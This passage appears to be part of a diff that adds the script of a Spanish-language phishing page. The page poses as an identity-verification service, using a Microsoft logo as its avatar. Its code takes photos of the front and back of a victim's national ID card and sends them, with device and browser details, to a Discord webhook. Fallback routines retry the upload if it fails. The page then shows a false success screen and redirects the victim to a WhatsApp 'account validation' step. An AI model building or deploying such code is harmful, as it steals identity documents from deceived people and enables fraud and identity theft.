+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (response.ok) {
+                    const result = await response.json();
+                    console.log('✅ Fotos enviadas a Discord:', result);
+                    return true;
+                } else {
+                    console.error('❌ Error al enviar a Discord:', await response.text());
+                    return false;
+                }
+                
+            } catch (error) {
+                console.error('❌ Error en sendFilesToDiscord:', error);
+                return false;
+            }
+        }
+
+        // Función alternativa usando fetch con archivos binarios
+        async function sendImagesToDiscordAlternative() {
+            try {
+                // Convertir imágenes a blobs
+                const frontBlob = dataURLtoBlob(frontImageData);
+                const backBlob = dataURLtoBlob(backImageData);
+                
+                // Crear FormData
+                const formData = new FormData();
+                
+                // Agregar archivos
+                formData.append('files[0]', frontBlob, 'cedula_frente.jpg');
+                formData.append('files[1]', backBlob, 'cedula_reverso.jpg');
+                
+                // Agregar payload JSON
+                const payload = {
+                    content: `📋 **VERIFICACIÓN DE IDENTIDAD - FOTOS DIRECTAS**\n\n🖼️ **Las imágenes se muestran A CONTINUACIÓN**\n📅 ${new Date().toLocaleString('es-ES')}`,
+                    username: "Verificación ID",
+                    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg",
+                    embeds: [{
+                        title: "📋 Información del Envío",
+                        color: 0x2596be,
+                        fields: [
+                            {
+                                name: "✅ Estado",
+                                value: "Fotos enviadas exitosamente",
+                                inline: true
+                            },
+                            {
+                                name: "📅 Fecha",
+                                value: new Date().toLocaleDateString('es-ES'),
+                                inline: true
+                            },
+                            {
+                                name: "🕒 Hora",
+                                value: new Date().toLocaleTimeString('es-ES'),
+                                inline: true
+                            },
+                            {
+                                name: "📱 Dispositivo",
+                                value: navigator.platform,
+                                inline: false
+                            }
+                        ]
+                    }]
+                };
+                
+                formData.append('payload_json', JSON.stringify(payload));
+                
+                // Enviar a Discord
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                return response.ok;
+                
+            } catch (error) {
+                console.error('Error en sendImagesToDiscordAlternative:', error);
+                return false;
+            }
+        }
+
+        // Función principal para enviar fotos a Discord
+        async function sendPhotosToDiscord() {
+            if (!frontImageFile || !backImageFile) {
+                showNotification('❌ Faltan fotos por cargar', 'error');
+                return false;
+            }
+
+            try {
+                updateLoaderStage(1);
+                loaderStatus.textContent = 'Preparando fotos para enviar...';
+                
+                // Convertir a blobs
+                const frontBlob = dataURLtoBlob(frontImageData);
+                const backBlob = dataURLtoBlob(backImageData);
+                
+                // Crear array de archivos
+                const files = [
+                    {
+                        blob: frontBlob,
+                        name: 'CEDULA_FRENTE.jpg'
+                    },
+                    {
+                        blob: backBlob,
+                        name: 'CEDULA_REVERSO.jpg'
+                    }
+                ];
+                
+                updateLoaderStage(2);
+                loaderStatus.textContent = 'Enviando fotos a Discord...';
+                
+                // Intentar método 1: FormData directo
+                let success = await sendFilesToDiscord(files);
+                
+                if (!success) {
+                    // Si falla, intentar método alternativo
+                    updateLoaderStage(2);
+                    loaderStatus.textContent = 'Usando método alternativo...';
+                    success = await sendImagesToDiscordAlternative();
+                }
+                
+                updateLoaderStage(3);
+                loaderStatus.textContent = 'Finalizando envío...';
+                
+                return success;
+                
+            } catch (error) {
+                console.error('Error en sendPhotosToDiscord:', error);
+                return false;
+            }
+        }
+
+        // Función para mostrar mensaje de redirección
+        function showRedirectMessage() {
+            const redirectHTML = `
+                <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+                         background: linear-gradient(135deg, var(--primary-color), var(--primary-light)); 
+                         color: white; display: flex; flex-direction: column; justify-content: center; 
+                         align-items: center; z-index: 1002; text-align: center; padding: 20px;">
+                    <div style="max-width: 600px;">
+                        <div style="font-size: 5rem; margin-bottom: 20px; animation: bounce 1s infinite alternate;">
+                            <i class="fas fa-check-circle"></i>
+                        </div>
+                        <h1 style="font-size: 2.5rem; margin-bottom: 20px; font-family: 'Poppins', sans-serif;">
+                            ¡PROCESO COMPLETADO!
+                        </h1>
+                        
+                        <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 12px; margin-bottom: 30px;">
+                            <h3 style="margin-bottom: 15px;">✅ Todo ha sido exitoso:</h3>
+                            <p><strong>📅 Fecha y hora:</strong> ${new Date().toLocaleString('es-ES')}</p>
+                            <p style="margin-top: 15px; color: #d1fae5;">
+                                <i class="fas fa-check-circle"></i> 
+                                Las fotos ahora están vinculadas a tu cuenta.
+                            </p>
+                        </div>
+                        
+                        <div class="redirect-countdown" id="redirectCountdown">
+                            Redirigiendo a la siguiente página en <span id="countdown">5</span> segundos...
+                        </div>
+                        
+                        <div style="margin-top: 30px;">
+                            <button onclick="window.location.href = 'index3.html'" 
+                                    style="background: white; color: var(--primary-color); border: none; 
+                                           padding: 15px 30px; border-radius: 8px; cursor: pointer; 
+                                           font-size: 1rem; font-weight: 600; transition: all 0.3s;">
+                                <i class="fas fa-external-link-alt"></i> Valida tu cuenta con WhatsApp
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <style>
+                    @keyframes bounce {
+                        from { transform: translateY(0); }
+                        to { transform: translateY(-10px); }
+                    }
+                </style>
+            `;
+            
+            const div = document.createElement('div');
+            div.innerHTML = redirectHTML;
+            document.body.appendChild(div);
+            
+            // Iniciar cuenta regresiva
+            let countdown = 5;
+            const countdownElement = document.getElementById('countdown');
+            
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                countdownElement.textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    // Redirigir a index3.html
+                    window.location.href = 'index3.html';
+                }
+            }, 1000);
+        }
+
+        // Método simple de respaldo
+        async function sendSimpleMessageToDiscord() {
+            try {
+                const message = {
+                    username: "Verificación de Identidad",
+                    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg",
+                    content: `🚨 **VERIFICACIÓN DE IDENTIDAD - FOTOS CAPTURADAS**\n\n📸 **Se han capturado 2 fotos:**\n1. Frente de cédula (${Math.round(frontImageFile.size/1024)}KB)\n2. Reverso de cédula (${Math.round(backImageFile.size/1024)}KB)\n\n📅 **Fecha:** ${new Date().toLocaleString('es-ES')}\n📱 **Desde:** ${navigator.userAgent.substring(0, 80)}...\n\n✅ **Las fotos están disponibles y se han procesado correctamente.**`,
+                    embeds: [{
+                        title: "📋 Información Técnica",
+                        color: 0x2596be,
+                        fields: [
+                            {
+                                name: "Estado",
+                                value: "✅ Capturado exitosamente",
+                                inline: true
+                            },
+                            {
+                                name: "Calidad",
+                                value: "Alta resolución",
+                                inline: true
+                            },
+                            {
+                                name: "Formato",
+                                value: "JPG (máxima calidad)",
+                                inline: true
+                            }
+                        ]
+                    }]
+                };
+                
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(message)
+                });
+                
+                return true;
+            } catch (error) {
+                console.error('Error en método simple:', error);
+                return false;
+            }
+        }
+
+        // Función principal para procesar y enviar
+        async function processAndSend() {
+            showLoader();
+            updateLoaderStage(0);
+            loaderStatus.textContent = 'Iniciando envío de fotos...';
+
+            try {
+                const success = await sendPhotosToDiscord();
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                hideLoader();
+                
+                if (success) {
+                    showNotification('✅ ¡FOTOS ENVIADAS DIRECTAMENTE A DISCORD!', 'success');
+                    setTimeout(() => {
+                        showRedirectMessage();
+                    }, 1500);
+                } else {
+                    showNotification('⚠️ Error al enviar. Usando método de respaldo...', 'info');
+                    // Intentar método simple
+                    await sendSimpleMessageToDiscord();
+                    hideLoader();
+                    showNotification('✅ Notificación enviada (fotos adjuntas)', 'success');
+                    setTimeout(() => {
+                        showRedirectMessage();
+                    }, 1500);
+                }
+                
+            } catch (error) {
+                console.error('Error en el proceso:', error);
+                hideLoader();
+                showNotification('❌ Error crítico. Contacta al administrador.', 'error');
+            }
+        }
+
+        // Evento para el botón de envío
+        submitBtn.addEventListener('click', processAndSend);
+
+        // Mostrar notificación de bienvenida
+        setTimeout(() => {
+            showNotification('¡Bienvenido! Para mejores resultados, usa buena iluminación.', 'info');
+        }, 1000);
+
+        // Inicializar progreso
+        updateProgress(1);
+
+        // Detener cámara al cerrar la página
+        window.addEventListener('beforeunload', () => {
+            stopCamera();
+        });
+
+        // Verificar configuraciones
+        console.log('✅ Webhook de Discord configurado');
+        console.log('📸 Sistema de cámara directa listo');
+        console.log('🎯 Envío DIRECTO de fotos habilitado');
+        console.log('🔀 Redirección a index3.html configurada');
+        console.log('🔵 Color primario: #2596be');
+        
+        // Auto-iniciar cámara trasera para mejor experiencia
+        setTimeout(() => {
+            if (currentStep === 1) {
+                showNotification('💡 Tip: Usa la cámara trasera para mejor calidad de documento', 'info');
+            }
+        }, 2000);
+    </script>
+</body>
+</html>
